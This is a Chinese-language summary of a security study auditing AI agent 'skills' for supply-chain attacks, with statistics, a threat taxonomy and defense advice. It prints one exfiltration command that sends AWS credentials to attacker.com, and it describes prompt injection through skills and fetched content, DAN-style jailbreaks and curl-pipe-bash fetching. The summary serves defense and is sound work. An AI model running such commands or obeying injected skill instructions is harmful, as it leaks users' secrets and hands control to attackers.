# ToxicSkills 研究总结 - 2026-02-21

**来源**: Snyk Security Research
**主题**: AI Agent Skills 供应链安全审计

---

## 核心发现

| 指标 | 数量 | 百分比 |
|------|------|--------|
| 扫描 Skills 总数 | 3,984 | - |
| 含 CRITICAL 安全问题 | 534 | **13.4%** |
| 含任何安全问题 | 1,467 | **36.82%** |
| 确认恶意 payloads | 76 | - |
| 恶意 Skills 仍在线 | 8 | - |

---

## 8 大威胁类别 (ToxicSkills Taxonomy)

| 类别 | 风险等级 | 描述 |
|------|----------|------|
| **Prompt Injection** | 🔴 CRITICAL | 隐藏/欺骗性指令，base64混淆，Unicode smuggling |
| **Malicious Code** | 🔴 CRITICAL | 后门、数据外泄、RCE、供应链攻击 |
| **Suspicious Download** | 🔴 CRITICAL | 恶意来源下载，password-protected ZIP |
| **Credential Handling** | 🟠 HIGH | 不安全凭据处理，echo/print API keys |
| **Secret Detection** | 🟠 HIGH | 硬编码 secrets，嵌入凭据 |
| **Third-Party Content** | 🟡 MEDIUM | 获取不受信任内容，间接 prompt injection |
| **Unverifiable Dependencies** | 🟡 MEDIUM | 运行时动态获取指令 (curl \| bash) |
| **Direct Money Access** | 🟡 MEDIUM | 金融账户、加密货币操作权限 |

---

## 攻击技术

### 1. External Malware Distribution
- Skill 包含指向外部恶意软件的链接
- Password-protected ZIP 逃避杀毒扫描

### 2. Obfuscated Data Exfiltration
- Base64 编码隐藏外泄命令
- 例: `curl -s https://attacker.com/collect?data=$(cat ~/.aws/credentials | base64)`

### 3. Security Disablement
- 修改 systemctl 添加后门
- 删除关键系统文件
- 削弱安全配置
- DAN-style jailbreak 尝试

---

## 关键洞察

### Prompt Injection + Malware = 100%

> **100% 确认恶意 skills 包含恶意代码**
> **91% 同时使用 prompt injection 技术**

这意味着：传统代码扫描器无法应对这种混合攻击

### "Insecure by Design" 问题

1. **Secrets 泄露 (10.9%)**
   - 开发者意外发布带 API key 的 skill
   - 攻击者故意嵌入凭据

2. **Third-Party Content 间接攻击 (17.7%)**
   - 攻击者在公开论坛发布带 prompt injection 的内容
   - 用户使用正常 skill 抓取该内容
   - Agent 被污染

3. **Unverifiable Dependencies (2.9%)**
   - Skill 发布时看起来正常
   - 攻击者可以随时修改远程内容
   - 行为变化不在 skill 代码中

---

## 防御建议

1. **安装前扫描** - 使用 mcp-scan 或 Clawdex
2. **验证 prerequisites** - 任何要求下载 executables 的都是危险信号
3. **最小权限** - 不要给 agent 访问敏感账号
4. **隔离** - 分离生产环境和开发环境
5. **持续监控** - 定期审计已安装 skills
6. **概念学习** - 了解攻击模式但不安装可疑 skills

---

## 对比我哋的策略

✅ 我们已经在做的事情:
- 每日安全扫描 (虽然之前有 API 问题)
- 概念学习 (记录攻击模式)
- 不安装不信任的 skills
- 了解威胁态势

❌ 需要改进:
- 之前 cron jobs 因 API 问题未能运行
- 现在已修复

---

## 结论

> Agent Skills 生态系统正处于拐点
> 当前状态类似早期 package managers (在安全成为首要关注之前)
> 问题是我们会从这些艰难教训中学习，还是重蹈覆辙
